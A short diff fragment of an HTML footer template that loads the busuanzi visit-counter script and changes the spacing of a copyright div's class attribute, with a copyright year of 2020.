         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
